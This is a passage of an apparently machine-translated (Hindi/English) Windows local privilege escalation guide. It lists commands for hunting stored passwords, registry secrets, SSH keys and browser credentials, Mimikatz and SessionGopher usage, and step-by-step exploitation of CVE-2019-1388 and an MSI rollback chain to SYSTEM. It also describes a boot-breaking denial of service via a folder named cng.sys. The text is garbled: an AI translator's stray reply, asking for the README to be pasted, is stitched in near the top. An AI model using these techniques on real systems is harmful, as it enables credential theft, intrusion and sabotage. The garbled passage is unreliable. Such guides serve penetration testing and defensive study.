%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
माफ़ करें — मेरे पास प्रोजेक्ट फाइलों तक सीधा एक्सेस नहीं है। कृपया "src/windows-hardening/windows-local-privilege-escalation/README.md" की सामग्री यहाँ पेस्ट करें या बताएं किन फाइलों को मैं खोजूं/अनुवाद करूं, तब मैं आगे बढ़ता हूँ।
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin में Credentials

आपको Bin को भी जांचना चाहिए कि इसके अंदर credentials मौजूद तो नहीं

कई प्रोग्रामों द्वारा सहेजे गए पासवर्ड को recover करने के लिए आप उपयोग कर सकते हैं: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Registry के अंदर

**अन्य संभावित registry keys जिनमें credentials हो सकते हैं**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ब्राउज़र इतिहास

You should check for dbs where passwords from **Chrome or Firefox** are stored.\
साथ ही ब्राउज़रों के history, bookmarks और favourites की भी जाँच करें क्योंकि वहाँ शायद कुछ **passwords are** स्टोर हो सकते हैं।

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** Windows ऑपरेटिंग सिस्टम के भीतर निर्मित एक तकनीक है जो विभिन्न भाषाओं के सॉफ़्टवेयर components के बीच **पारस्परिक संचार (intercommunication)** की अनुमति देती है। प्रत्येक COM component को **class ID (CLSID)** के जरिए पहचाना जाता है और प्रत्येक component एक या अधिक interfaces के माध्यम से functionality expose करता है, जिन्हें interface IDs (IIDs) द्वारा पहचाना जाता है।

COM classes और interfaces को registry में **HKEY\CLASSES\ROOT\CLSID** और **HKEY\CLASSES\ROOT\Interface** के अंतर्गत परिभाषित किया जाता है। यह registry **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** को मर्ज करके बनाया जाता है = **HKEY\CLASSES\ROOT.**

इस registry के CLSIDs के अंदर आप child registry **InProcServer32** पा सकते हैं जो एक **default value** रखता है जो एक **DLL** की ओर इशारा करता है और एक value होती है जिसका नाम **ThreadingModel** होता है जो **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) या **Neutral** (Thread Neutral) हो सकती है।

![](<../../images/image (729).png>)

सिद्धांततः, अगर आप उन किसी भी DLLs को **overwrite any of the DLLs** कर सकें जो execute होने वाले हैं, तो आप **escalate privileges** कर सकते हैं अगर वह DLL किसी दूसरे user द्वारा execute किया जा रहा हो।

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**किसी विशिष्ट फ़ाइलनाम वाली फ़ाइल खोजें**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**रजिस्ट्री में key names और passwords खोजें**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Tools जो passwords खोजते हैं

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin। मैंने यह plugin बनाया है ताकि यह **automatically execute every metasploit POST module that searches for credentials** victim के अंदर चलाए।\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) स्वचालित रूप से इस पृष्ठ में उल्लिखित उन सभी फ़ाइलों को खोजता है जिनमें passwords होते हैं।\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) एक और बढ़िया tool है जो system से password निकालने के लिए उपयोग होता है।

यह tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) कई tools के **sessions**, **usernames** और **passwords** खोजता है जो यह डेटा clear text में सेव करते हैं (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

कल्पना करें कि **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**। वही प्रोसेस **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**।\
अगर आपके पास **full access to the low privileged process** है, तो आप `OpenProcess()` से बनाए गए **privileged process के open handle** को पकड़कर उस पर **inject a shellcode** कर सकते हैं।\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Shared memory segments, जिन्हें **pipes** कहा जाता है, process communication और data transfer सक्षम करते हैं।

Windows में **Named Pipes** नाम की एक सुविधा है, जो unrelated processes को data share करने की अनुमति देती है, यहां तक कि अलग networks पर भी। यह client/server architecture जैसा होता है, जिसमें भूमिकाएँ **named pipe server** और **named pipe client** के रूप में परिभाषित होती हैं।

जब कोई **client** pipe के माध्यम से data भेजता है, तो pipe सेट करने वाला **server** आवश्यक **SeImpersonate** rights होने पर उस **client** की पहचान अपनाने में सक्षम होता है। किसी ऐसे **privileged process** की पहचान करना जो आपके बनाए pipe के माध्यम से communicate करता हो और जिसकी आप नकल कर सकें, आपको मौका देता है कि उस प्रक्रिया की पहचान अपनाकर **gain higher privileges** किया जाए जब वह आपके स्थापित pipe के साथ interact करे। इस तरह के attack को execute करने के निर्देशों के लिए उपयोगी guides [**here**](named-pipe-client-impersonation.md) और [**here**](#from-high-integrity-to-system) पर मिलते हैं।

Also the following tool allows to **intercept a named pipe communication with a tool like burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **and this tool allows to list and see all the pipes to find privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Misc

### File Extensions that could execute stuff in Windows

इस पेज को देखें **[https://filesec.io/](https://filesec.io/)**

### **Monitoring Command Lines for passwords**

जब user के रूप में shell मिलता है, तो हो सकता है कि scheduled tasks या अन्य processes execute हो रहे हों जो **pass credentials on the command line**। नीचे दिया गया script हर दो सेकंड में process command lines को capture करता है और वर्तमान स्थिति की तुलना पिछले स्थिति से करता है, और किसी भी अंतर को output करता है।
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## प्रक्रियाओं से पासवर्ड चुराना

## Low Priv User से NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

यदि आपके पास graphical interface (via console or RDP) तक पहुँच है और UAC सक्षम है, तो कुछ Microsoft Windows वर्ज़नों में unprivileged user से भी terminal या कोई अन्य process जैसे "NT\AUTHORITY SYSTEM" चलाना संभव होता है।

इससे एक ही vulnerability के जरिए privileges escalate करना और UAC bypass करना दोनों एक साथ संभव हो जाता है। अतिरिक्त रूप से, किसी भी चीज़ को install करने की ज़रूरत नहीं होती और प्रक्रिया के दौरान जो binary उपयोग किया जाता है, वह Microsoft द्वारा signed और जारी किया गया होता है।

प्रभावित सिस्टमों में कुछ निम्नलिखित हैं:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
इस vulnerability को exploit करने के लिए, निम्नलिखित कदम उठाना आवश्यक है:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

यह हमला मूल रूप से Windows Installer के rollback फीचर का दुरुपयोग करके uninstall प्रक्रिया के दौरान वैध फ़ाइलों को malicious फ़ाइलों से बदलने पर आधारित है। इसके लिए attacker को एक **malicious MSI installer** बनाना होता है जो `C:\Config.Msi` फ़ोल्डर को hijack करने के लिए इस्तेमाल होगा, जिसे बाद में Windows Installer rollback files को store करने के लिए उपयोग करता है — uninstall के दौरान rollback files को बदल कर उनमें malicious payload डाली जाएगी।

संक्षेप में तकनीक निम्नानुसार है:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- एक `.msi` बनाएं जो writable फ़ोल्डर (`TARGETDIR`) में एक harmless फ़ाइल (जैसे `dummy.txt`) install करे।
- installer को **"UAC Compliant"** के रूप में मार्क करें, ताकि एक **non-admin user** इसे चला सके।
- install के बाद फ़ाइल पर एक **handle** खुला रखें।

- Step 2: Begin Uninstall
- वही `.msi` uninstall करें।
- uninstall प्रक्रिया फाइलों को `C:\Config.Msi` में स्थानांतरित करना और उन्हें `.rbf` नाम से rename करना शुरू कर देती है (rollback backups)।
- फ़ाइल के `C:\Config.Msi\<random>.rbf` बनने का पता लगाने के लिए `GetFinalPathNameByHandle` का उपयोग करके **open file handle** को poll करें।

- Step 3: Custom Syncing
- `.msi` में एक **custom uninstall action (`SyncOnRbfWritten`)** शामिल है जो:
- उस समय signal करता है जब `.rbf` लिखा गया हो।
- फिर uninstall को जारी रखने से पहले किसी अन्य event पर **wait** करता है।

- Step 4: Block Deletion of `.rbf`
- जब signal मिल जाए, तो `.rbf` फ़ाइल को `FILE_SHARE_DELETE` के बिना खोलें — इससे वह **delete होने से रोकती है**।
- फिर uninstall को खत्म करने के लिए वापस **signal** करें।
- Windows Installer `.rbf` को delete नहीं कर पाता, और चूँकि यह सब contents delete नहीं कर सकता, **`C:\Config.Msi` remove नहीं होता**।

- Step 5: Manually Delete `.rbf`
- आप (attacker) `.rbf` फ़ाइल को मैन्युअली delete कर देते हैं।
- अब **`C:\Config.Msi` खाली है**, hijack के लिए तैयार है।

> इस बिंदु पर, `C:\Config.Msi` को delete करने के लिए **SYSTEM-level arbitrary folder delete vulnerability** को trigger करें।

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- स्वयं `C:\Config.Msi` फ़ोल्डर फिर से बनाएं।
- **weak DACLs** सेट करें (उदा., Everyone:F), और `WRITE_DAC` के साथ एक handle खुला रखें।

- Step 7: Run Another Install
- `.msi` को फिर से install करें, जिसमें:
- `TARGETDIR`: Writable location।
- `ERROROUT`: एक variable जो forced failure ट्रिगर करे।
- यह install फिर से **rollback** ट्रिगर करने के लिए इस्तेमाल होगा, जो `.rbs` और `.rbf` पढ़ता है।

- Step 8: Monitor for `.rbs`
- `ReadDirectoryChangesW` का उपयोग करके `C:\Config.Msi` की निगरानी करें जब तक एक नया `.rbs` नहीं आ जाता।
- उसका filename कैप्चर करें।

- Step 9: Sync Before Rollback
- `.msi` में एक **custom install action (`SyncBeforeRollback`)** है जो:
- जब `.rbs` बनाया जाता है तो एक event को signal करता है।
- फिर जारी रखने से पहले **wait** करता है।

- Step 10: Reapply Weak ACL
- `.rbs created` event मिलने के बाद:
- Windows Installer `C:\Config.Msi` पर **strong ACLs** फिर से लागू करता है।
- लेकिन चूँकि आपके पास अभी भी `WRITE_DAC` के साथ एक handle खुला है, आप फिर से **weak ACLs** लागू कर सकते हैं।

> ACLs केवल handle open पर लागू होते हैं, इसलिए आप अभी भी फ़ोल्डर में लिख सकते हैं।

- Step 11: Drop Fake `.rbs` and `.rbf`
- `.rbs` फ़ाइल को एक **fake rollback script** से overwrite करें जो Windows को बताता है कि:
- आपकी `.rbf` फ़ाइल (malicious DLL) को एक **privileged location** में restore करे (उदा., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`)।
- आपकी fake `.rbf` गिराएँ जिसमें एक **malicious SYSTEM-level payload DLL** हो।

- Step 12: Trigger the Rollback
- sync event को signal करें ताकि installer resume हो जाए।
- एक **type 19 custom action (`ErrorOut`)** को configure किया गया है ताकि install को जानबूझकर एक ज्ञात पॉइंट पर fail कराया जा सके।
- इससे **rollback शुरू हो जाता है**।

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- आपकी malicious `.rbs` पढ़ता है।
- आपकी `.rbf` DLL को target location में copy कर देता है।
- अब आपकी **malicious DLL एक SYSTEM-loaded path में मौजूद है**।

- Final Step: Execute SYSTEM Code
- एक trusted **auto-elevated binary** (उदा., `osk.exe`) चलाएँ जो आपके hijacked DLL को load करे।
- **Boom**: आपका कोड **SYSTEM के रूप में execute** होता है।

### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

मुख्य MSI rollback तकनीक (पिछली वाली) यह मानती है कि आप एक **पूरे फ़ोल्डर** (उदा., `C:\Config.Msi`) को delete कर सकते हैं। लेकिन अगर आपकी vulnerability केवल **arbitrary file deletion** ही अनुमति देती है तो क्या होगा?

आप **NTFS internals** का दुरुपयोग कर सकते हैं: हर फ़ोल्डर के पास एक छिपा alternate data stream होता है जिसे कहा जाता है:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
यह स्ट्रीम फ़ोल्डर का **इंडेक्स मेटाडेटा** स्टोर करती है।

इसलिए, अगर आप किसी फ़ोल्डर की **`::$INDEX_ALLOCATION` स्ट्रीम को हटाते हैं**, तो NTFS फाइल सिस्टम से **पूरे फ़ोल्डर को हटा देता है**।

आप यह मानक फ़ाइल हटाने वाली APIs का उपयोग करके कर सकते हैं, जैसे:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> हालाँकि आप एक *file* delete API को कॉल कर रहे हैं, यह **फ़ोल्डर स्वयं ही डिलीट कर देता है**।

### फ़ोल्डर की सामग्री को हटाने से SYSTEM EoP तक
क्या होगा अगर आपका primitive आपको arbitrary files/folders हटाने की अनुमति नहीं देता, लेकिन यह **attacker-controlled फ़ोल्डर की *contents* को हटाने की अनुमति देता है**?

1. Step 1: एक चारा फ़ोल्डर और फ़ाइल सेटअप करें
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` पर एक **oplock** लगाएँ
- oplock तब **निष्पादन को रोक देता है** जब कोई विशेषाधिकार प्राप्त प्रक्रिया `file1.txt` को डिलीट करने की कोशिश करती है।
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. चरण 3: SYSTEM प्रक्रिया ट्रिगर करें (उदा., `SilentCleanup`)
- यह प्रक्रिया फ़ोल्डरों को स्कैन करती है (उदा., `%TEMP%`) और उनकी सामग्री हटाने की कोशिश करती है।
- जब यह `file1.txt` तक पहुँचता है, तो **oplock triggers** और आपका callback नियंत्रण संभाल लेता है।

4. चरण 4: oplock callback के अंदर – हटाने को रीडायरेक्ट करें

- विकल्प A: `file1.txt` को कहीं और स्थानांतरित करें
- यह oplock को तोड़े बिना `folder1` को खाली कर देता है।
- `file1.txt` को सीधे हटाएँ नहीं — इससे oplock समयपूर्व रूप से रिलीज़ हो जाएगा।

- विकल्प B: `folder1` को **junction** में कन्वर्ट करें:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- विकल्प C: **symlink** `\RPC Control` में बनाएं:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> यह NTFS internal stream को लक्षित करता है जो फ़ोल्डर का metadata संग्रहीत करता है — इसे डिलीट करने पर फ़ोल्डर डिलीट हो जाता है।

5. Step 5: Release the oplock
- SYSTEM process जारी रहता है और `file1.txt` को हटाने की कोशिश करता है।
- लेकिन अब, junction + symlink के कारण, यह वास्तव में निम्न को डिलीट कर रहा है:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**परिणाम**: `C:\Config.Msi` को SYSTEM द्वारा हटाया जाता है।

### Arbitrary Folder Create से Permanent DoS तक

ऐसी primitive का फायदा उठाएँ जो आपको **create an arbitrary folder as SYSTEM/admin** करने देता है — भले ही आप **फाइलें लिख न सकें** या **set weak permissions** नहीं कर सकें।

ऐसा **folder** (not a file) बनाएँ जिसका नाम एक **critical Windows driver** हो, उदाहरण के लिए:
```
C:\Windows\System32\cng.sys
```
- यह पथ सामान्यतः `cng.sys` kernel-mode ड्राइवर को संदर्भित करता है।
- यदि आप **इसे पहले से एक फ़ोल्डर के रूप में बना देते हैं**, तो Windows बूट पर वास्तविक ड्राइवर को लोड करने में असफल रहता है।
- फिर, Windows बूट के दौरान `cng.sys` लोड करने की कोशिश करता है।
- यह फ़ोल्डर देखता है, **वास्तविक ड्राइवर का समाधान करने में असफल रहता है**, और **क्रैश हो जाता है या बूट रुक जाता है**।
- वहाँ **कोई fallback नहीं है**, और **कोई recovery नहीं** बिना बाहरी हस्तक्षेप (उदा., boot repair or disk access) के।

## **High Integrity से SYSTEM तक**

### **नया service**

यदि आप पहले से ही एक High Integrity process पर चल रहे हैं, तो **SYSTEM तक का path** केवल **नया service बनाकर और उसे चलाकर** आसान हो सकता है:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> जब आप service binary बना रहे हों तो सुनिश्चित करें कि यह एक valid service है या कि binary आवश्यक क्रियाएँ तेजी से करता हो क्योंकि अगर यह valid service नहीं है तो इसे 20s में बंद कर दिया जाएगा।

### AlwaysInstallElevated

High Integrity process से आप **AlwaysInstallElevated registry entries को enable करने** और _**.msi**_ wrapper का उपयोग करके एक reverse shell **install करने** की कोशिश कर सकते हैं।\
[यहाँ involved registry keys और _.msi_ package को install करने के बारे में अधिक जानकारी।](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**आप** [**यहाँ कोड पा सकते हैं**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

यदि आपके पास वे token privileges हैं (संभावना है कि आप इसे पहले से ही High Integrity process में पाएंगे), तो आप SeDebug privilege के साथ लगभग किसी भी process (protected processes को छोड़कर) को खोल पाएंगे, उस process का **token copy** कर पाएंगे, और उस token के साथ एक **arbitrary process create** कर पाएंगे।\
इस technique का उपयोग आम तौर पर SYSTEM के रूप में चल रहे किसी भी process को चुना जाता है जिसके पास सभी token privileges हों (_हाँ, आप SYSTEM processes पा सकते हैं जिनके पास सभी token privileges नहीं होते_)।\
**आप एक** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

यह technique meterpreter द्वारा `getsystem` में escalate करने के लिए उपयोग की जाती है। यह technique pipe बनाकर और फिर उस pipe पर लिखने के लिए किसी service को create/abuse करने से मिलकर बनी है। फिर, उस pipe को बनाया हुआ **server** जो **`SeImpersonate`** privilege का उपयोग करता है, pipe client (service) के token को **impersonate** कर सकेगा और SYSTEM privileges प्राप्त कर लेगा।\
अगर आप [**name pipes के बारे में और जानना चाहते हैं तो यह पढ़ें**](#named-pipe-client-impersonation)。\
अगर आप एक उदाहरण पढ़ना चाहते हैं कि [**कैसे name pipes का उपयोग करके high integrity से System तक जाएँ**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

यदि आप किसी SYSTEM के रूप में चल रहे process द्वारा load की जा रही किसी dll को **hijack** करने में सफल हो जाते हैं तो आप उन permissions के साथ arbitrary code execute कर पाएँगे। इसलिए Dll Hijacking इस प्रकार के privilege escalation के लिए भी उपयोगी है, और साथ ही इसे high integrity process से हासिल करना कहीं अधिक आसान है क्योंकि उसके पास dlls को load करने के लिए उपयोग किए जाने वाले folders पर **write permissions** होंगी।\
**आप** [**यहाँ Dll hijacking के बारे में और जान सकते हैं**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**पढ़ें:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vectors खोजने के लिए सबसे अच्छा टूल:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Misconfigurations और संवेदनशील फ़ाइलों की जांच करें (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). पता चला।**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- कुछ संभावित misconfigurations की जांच करें और जानकारी इकट्ठा करें (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Misconfigurations की जांच करें**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- यह PuTTY, WinSCP, SuperPuTTY, FileZilla, और RDP saved session जानकारी निकालता है। लोकल में -Thorough का उपयोग करें।**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager से credentials निकालता है। पता चला।**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- एकत्र किए गए passwords को डोमेन पर spray करता है**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh एक PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer और man-in-the-middle टूल है।**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- बेसिक privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- ज्ञात privesc कमजोरियों के लिए खोज (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- लोकल चेक्स **(Admin rights की आवश्यकता)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- ज्ञात privesc कमजोरियों के लिए खोज (VisualStudio का उपयोग करके compile करने की आवश्यकता) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- होस्ट का enumeration करता है और misconfigurations खोजता है (ज़्यादा एक gather info टूल है न कि privesc) (compile करने की आवश्यकता) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- कई सॉफ़्टवेयर से credentials निकालता है (github पर precompiled exe)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp का C# पोर्ट**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Misconfiguration की जांच (executable github पर precompiled). अनुशंसित नहीं। यह Win10 में अच्छी तरह काम नहीं करता।\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- संभावित misconfigurations की जांच (python से exe). अनुशंसित नहीं। यह Win10 में अच्छी तरह काम नहीं करता।

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- इस पोस्ट पर आधारित बनाया गया टूल (यह accesschk के बिना ठीक से काम करने के लिए accesschk की आवश्यकता नहीं है पर यह इसका उपयोग कर सकता है).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** के आउटपुट को पढ़ता है और काम करने वाले exploits की सिफारिश करता है (लोकल python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** के आउटपुट को पढ़ता है और काम करने वाले exploits की सिफारिश करता है (लोकल python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

आपको प्रोजेक्ट को सही .NET संस्करण का उपयोग करके compile करना होगा ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). लक्षित होस्ट पर इंस्टॉल .NET संस्करण देखने के लिए आप कर सकते हैं:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## संदर्भ

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
